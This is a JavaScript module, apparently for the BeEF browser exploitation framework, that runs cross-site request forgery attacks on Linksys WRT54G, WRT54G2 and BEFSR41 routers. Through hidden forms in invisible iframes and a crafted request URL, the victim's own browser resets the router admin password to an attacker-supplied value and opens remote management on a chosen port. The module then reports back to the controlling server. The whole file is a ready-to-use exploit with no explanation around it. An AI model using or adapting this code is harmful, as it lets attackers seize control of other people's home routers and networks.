function pwn_wrt54g2() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "Manage.tri";

  var iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_USE_HTTP');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP_S');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORDMOD');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD_CONFIRM');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '_http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_WLFILTER');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_REMOTE');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PORT');
  input.setAttribute('value', port);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_UPNP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'layout');
  input.setAttribute('value', 'en');
  form.appendChild(input);

  iframe.contentWindow.document.body.appendChild(form);
  form.submit();
}

function pwn_wrt54g() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "manage.tri";

  var iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'remote_mgt_https');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'https_enable');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'PasswdModify');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_passwd');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_passwdConfirm');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '_http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'web_wl_filter');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'remote_management');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_wanport');
  input.setAttribute('value', port);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'upnp_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'layout');
  input.setAttribute('value', 'en');
  form.appendChild(input);

  iframe.contentWindow.document.body.appendChild(form);
  form.submit();
}

function pwn_befsr41() {
  var iframe = beef.dom.createInvisibleIframe();
  iframe.setAttribute('src', '<%= @base %>Gozila.cgi?PasswdModify=1&sysPasswd=<%= @password %>&sysPasswdConfirm=<%= @password %>&Remote_Upgrade=1&Remote_Management=1&RemotePort=<%= @port %>&UPnP_Work=0');
}

beef.execute(function() {
  pwn_wrt54g2();
  pwn_wrt54g();
  pwn_befsr41();
  beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
});
